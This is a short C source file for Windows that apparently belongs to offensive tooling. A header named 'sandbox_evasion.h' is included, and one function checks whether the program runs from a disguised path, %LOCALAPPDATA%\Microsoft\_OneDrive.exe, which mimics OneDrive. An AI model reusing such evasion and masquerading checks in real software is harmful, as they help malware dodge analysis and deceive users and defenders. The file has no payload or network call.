#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include "sandbox_evasion.h"

BOOL CheckLaunchDirectory(void) {

	WCHAR ExePath[MAX_PATH];
	
	DWORD dwGetFilePath = GetModuleFileName(NULL,ExePath,MAX_PATH);
	if (dwGetFilePath == 0) { printf("[x] GetModuleFileName failed, err -> %d\n", GetLastError()); return -1; }
	//wprintf(TEXT("[+] Exe Path: %s\n"), ExePath);

	WCHAR path[MAX_PATH];
	ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Microsoft\\_OneDrive.exe", path, MAX_PATH);
	//wprintf(L"[+] PATH TO COMPARE WITH: %s\n", path);
	if (_tcsicmp(ExePath, path) != 0) {
		//printf("[x] PATHS ARE DIFFERENT\n");
		return FALSE;
	}
	//printf("[+] PATHS ARE IDENTICAL\n");
	return TRUE;
}